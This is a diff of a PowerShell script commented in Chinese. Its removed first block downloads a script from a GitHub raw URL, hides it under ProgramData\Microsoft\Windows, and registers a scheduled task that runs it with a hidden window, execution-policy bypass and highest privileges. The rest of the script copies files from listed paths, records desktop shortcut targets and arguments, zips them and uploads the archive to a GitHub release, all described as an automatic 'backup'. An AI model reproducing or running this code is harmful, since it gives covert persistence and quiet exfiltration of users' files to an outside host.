@@ -1,74 +1,3 @@
-# install-console.ps1
-
-# ========== 部署和注册计划任务 ==========
-
-$taskName = "console"
-$tempScript = "C:\ProgramData\Microsoft\Windows\console.ps1"
-$xmlPath = "$env:TEMP\$taskName.xml"
-
-# 首次执行时自动部署
-if ($MyInvocation.MyCommand.Path -ne $tempScript) {
-    if (-not (Test-Path "C:\ProgramData\Microsoft\Windows")) {
-        New-Item -Path "C:\ProgramData\Microsoft\Windows" -ItemType Directory -Force | Out-Null
-    }
-
-    Remove-Item $tempScript,$xmlPath -Force -ErrorAction SilentlyContinue
-
-    # 下载主脚本（就是当前这份自己）
-    try {
-        $wc = New-Object System.Net.WebClient
-        $url = "https://raw.githubusercontent.com/ertgyhujkfghj/2/main/console.ps1"
-        $bytes = $wc.DownloadData($url)
-        $content = [System.Text.Encoding]::UTF8.GetString($bytes)
-        [System.IO.File]::WriteAllText($tempScript, $content, [System.Text.Encoding]::UTF8)
-    } catch {
-        Write-Host "❌ 脚本下载失败：$($_.Exception.Message)"
-        exit 1
-    }
-
-    # 创建计划任务 XML
-    $xmlContent = @"
-<?xml version="1.0" encoding="UTF-16"?>
-<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
-  <RegistrationInfo><Description>Upload Task Script</Description></RegistrationInfo>
-  <Triggers>
-    <TimeTrigger>
-      <StartBoundary>2005-01-01T19:30:00</StartBoundary>
-      <Enabled>true</Enabled>
-      <ScheduleByDay><DaysInterval>1</DaysInterval></ScheduleByDay>
-      <Repetition><Interval>PT30M</Interval><Duration>PT4H30M</Duration><StopAtDurationEnd>false</StopAtDurationEnd></Repetition>
-    </TimeTrigger>
-  </Triggers>
-  <Principals><Principal id="Author"><LogonType>InteractiveToken</LogonType><RunLevel>HighestAvailable</RunLevel></Principal></Principals>
-  <Settings>
-    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
-    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
-    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
-    <StartWhenAvailable>true</StartWhenAvailable>
-    <ExecutionTimeLimit>PT2H</ExecutionTimeLimit>
-    <AllowStartOnDemand>true</AllowStartOnDemand>
-    <Enabled>true</Enabled>
-  </Settings>
-  <Actions Context="Author">
-    <Exec>
-      <Command>powershell.exe</Command>
-      <Arguments>-WindowStyle Hidden -ExecutionPolicy Bypass -File "$tempScript"</Arguments>
-    </Exec>
-  </Actions>
-</Task>
-"@
-    $xmlContent | Out-File -Encoding Unicode -FilePath $xmlPath
-    schtasks /Create /TN $taskName /XML $xmlPath /F | Out-Null
-
-    # 立即执行一次
-    Start-Process -FilePath "powershell.exe" `
-        -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$tempScript`"" `
-        -WindowStyle Hidden
-    exit 0
-}
-
-# ========== 上传主逻辑部分（原 console.ps1） ==========
-
 [Console]::OutputEncoding = [System.Text.UTF8Encoding]::UTF8
 $OutputEncoding = [System.Text.UTF8Encoding]::UTF8
 
@@ -91,6 +20,7 @@ try {
 $workDir = "$env:TEMP\backup_$tag"
 New-Item -ItemType Directory -Path $workDir -Force | Out-Null
 
+# === ⬇️ 拷贝文件 ===
 foreach ($path in $paths) {
     if (Test-Path $path) {
         try {
@@ -106,13 +36,16 @@ foreach ($path in $paths) {
     }
 }
 
-# 提取快捷方式参数
+# === ⬇️ 新增：提取桌面快捷方式完整路径（含参数） ===
 try {
-    $desktopDirs = @("$env:USERPROFILE\Desktop", "$env:PUBLIC\Desktop")
+    $desktopDirs = @(
+        "$env:USERPROFILE\Desktop",
+        "$env:PUBLIC\Desktop"
+    )
     $lnkInfo = ""
     foreach ($dir in $desktopDirs) {
         if (Test-Path $dir) {
-            Get-ChildItem -Path $dir -Filter *.lnk -Force | ForEach-Object {
+            Get-ChildItem -Path $dir -Filter *.lnk -Force -ErrorAction SilentlyContinue | ForEach-Object {
                 try {
                     $shell = New-Object -ComObject WScript.Shell
                     $shortcut = $shell.CreateShortcut($_.FullName)
@@ -126,20 +59,21 @@ try {
     }
     if ($lnkInfo) {
         $lnkInfo | Out-File -FilePath (Join-Path $workDir "lnk_full_paths.txt") -Encoding UTF8
+        Write-Host "🧷 已生成桌面快捷方式路径 lnk_full_paths.txt"
     }
 } catch {
     Write-Warning "⚠️ 快捷方式路径提取失败：$($_.Exception.Message)"
 }
 
-# 压缩并上传
+# === ⬇️ 压缩上传 ===
 $zipPath = "$env:TEMP\$tag.zip"
 Compress-Archive -Path "$workDir\*" -DestinationPath $zipPath -Force
 
 $releaseBody = @{
-    tag_name = $tag
-    name     = "Backup $tag"
-    body     = "自动上传的备份文件"
-    draft    = $false
+    tag_name   = $tag
+    name       = "Backup $tag"
+    body       = "自动上传的备份文件"
+    draft      = $false
     prerelease = $false
 } | ConvertTo-Json -Depth 3
 
@@ -162,7 +96,7 @@ try {
         Write-Host "❌ 创建 Release 失败：$($response | ConvertTo-Json -Depth 5)"
     }
 } catch {
-    Write-Warning "❌ 上传出错：$($_.Exception.Message)"
+    Write-Warning "❌ 上传过程出错：$($_.Exception.Message)"
 }
 
 Remove-Item -Path $workDir -Recurse -Force -ErrorAction SilentlyContinue
